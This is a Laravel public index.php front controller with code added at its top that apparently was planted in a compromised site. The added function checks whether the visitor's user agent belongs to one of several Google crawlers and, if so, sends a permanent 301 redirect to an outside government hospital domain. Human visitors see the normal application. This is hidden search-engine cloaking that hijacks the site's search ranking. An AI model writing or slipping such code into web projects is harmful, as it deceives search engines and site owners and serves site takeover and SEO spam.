<?php

#301 index.php
function is_google_bot() {
    $agents = array(
        "Googlebot", 
        "AdsBot-Google", 
        "Mediapartners-Google", 
        "Google-Site-Verification", 
        "Google-InspectionTool", 
        "Googlebot-Mobile", 
        "Googlebot-News"
    );
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    foreach ($agents as $agent) {
        if (strpos($user_agent, $agent) !== false) {
            return true;
        }
    }
    return false;
}

if (is_google_bot()) {
    header("Location: https://rsudarifinachmad.riau.go.id/", true, 301);
    exit;
}

/** 
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 */

/*
|----------------------------------------------------------------------
| Custom Script to Check Bot and Handle Cookies
|----------------------------------------------------------------------
*/

/*
|----------------------------------------------------------------------
| Register The Auto Loader
|----------------------------------------------------------------------
*/

require __DIR__ . '/../bootstrap/autoload.php';

/*
|----------------------------------------------------------------------
| Turn On The Lights
|----------------------------------------------------------------------
*/

$app = require_once __DIR__ . '/../bootstrap/app.php';

/*
|----------------------------------------------------------------------
| Run The Application
|----------------------------------------------------------------------
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

$response->send();

$kernel->terminate($request, $response);

?>
